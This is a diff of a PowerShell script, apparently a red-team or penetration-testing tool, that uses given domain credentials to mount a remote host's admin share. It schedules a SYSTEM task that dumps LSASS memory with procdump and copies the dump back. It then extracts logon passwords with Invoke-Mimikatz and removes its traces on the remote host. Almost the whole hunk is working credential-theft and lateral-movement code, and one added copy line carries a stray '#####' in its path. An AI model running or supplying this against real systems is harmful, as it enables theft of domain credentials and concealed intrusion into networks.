@@ -42,44 +42,63 @@ Param(
  $Pass
 )
 
+Write-Host "##### Mounting a share to \\$ComputerName\C$ at X: #####"
 $netuse_command = "cmd.exe /C net use X: \\$ComputerName\C$ /user:$Domain\$User $Pass"
 Invoke-Expression -Command:$netuse_command
 
+Write-Host "##### Making a dir called 'pd' on the remote host #####"
 $mkdir = "cmd.exe /C mkdir X:\pd"
 Invoke-Expression -Command:$mkdir
 
-$copy_procdump = "cmd.exe /C copy C:\pd\procdump.ps1 X:\pd\"
+Write-Host "##### Copying over procdump.ps1 to X:\pd\ #####"
+$copy_procdump = "cmd.exe /C copy C:\pd\procdump.ps1 X:\pd\#####"
 Invoke-Expression -Command:$copy_procdump
 
+Write-Host "##### Scheduling a task called pd to create a memory dump of the LSASS process using procdump.ps1 #####"
 $create_schtask = "cmd.exe /C schtasks /Create /TN pd /S $ComputerName /U $Domain\$User /P $Pass /SC ONCE /ST 22:00:00 /TR 'powershell.exe -exec bypass -file C:\pd\procdump.ps1' /RU SYSTEM"
 Invoke-Expression -Command:$create_schtask
 
+Write-Host "##### Running the scheduled task #####"
 $run_schtask = "cmd.exe /C schtasks /Run /S $ComputerName /TN pd /U $Domain\$User /P $Pass"
 Invoke-Expression -Command:$run_schtask
 
+Write-Host "##### Sleeping for 8 seconds #####"
 Start-Sleep -s 8
 
+Write-Host "##### Making a local directory at C:\pd\$ComputerName-dumps #####"
 $create_compdir = "cmd.exe /C mkdir C:\pd\$ComputerName-dumps"
 Invoke-Expression -Command:$create_compdir
 
+Write-Host "##### Copying LSASS dump from remote host to local directory C:\pd\$ComputerName-dumps #####"
 $copy_dumps = "cmd.exe /C copy X:\pd\*.dmp C:\pd\$ComputerName-dumps\"
 Invoke-Expression -Command:$copy_dumps
 
+Write-Host "##### Changing name of dump file to lsass.dmp #####"
 $change_name = "cmd.exe /C move C:\pd\$ComputerName-dumps\*.dmp C:\pd\$ComputerName-dumps\lsass.dmp"
 Invoke-Expression -Command:$change_name
 
+Write-Host "##### Copying lsass.dmp file to C:\pd\ for use with Mimikatz #####"
 $copy_to_pd = "cmd.exe /C copy C:\pd\$ComputerName-dumps\lsass.dmp C:\pd\"
 Invoke-Expression -Command:$copy_to_pd
 
+Write-Host "##### Extracting credentials from lsass.dmp file with Mimikatz #####"
 Invoke-Mimikatz -Command '"sekurlsa::minidump C:\pd\lsass.DMP" sekurlsa::logonPasswords exit >> report.txt'
 
-$cleanup_remote_system = "cmd.exe /C del X:\pd\"
+Write-Host "##### Sleeping for 5 seconds #####"
+Start-Sleep -s 5
+
+Write-Host "##### Starting cleanup on remote host #####"
+Write-Host "##### Removing C:\pd directory from remote host #####"
+$cleanup_remote_system = "cmd.exe /C rmdir /q /s X:\pd"
 Invoke-Expression -Command:$cleanup_remote_system
 
+Write-Host "##### Removing X: share from local system #####"
 $cleanup_share = "cmd.exe /C net use X: /delete"
 Invoke-Expression -Command:$cleanup_share
 
-$cleanup_schtask = "cmd.exe /C schtasks /Delete /TN pd /S $ComputerName /U $Domain\User /P $Pass"
+Write-Host "##### Deleting pd scheduled task on remote system #####"
+$cleanup_schtask = "cmd.exe /C schtasks /Delete /TN pd /F /S $ComputerName /U $Domain\$User /P $Pass"
+Invoke-Expression -Command:$cleanup_schtask
 }
 function Invoke-Mimikatz
 {
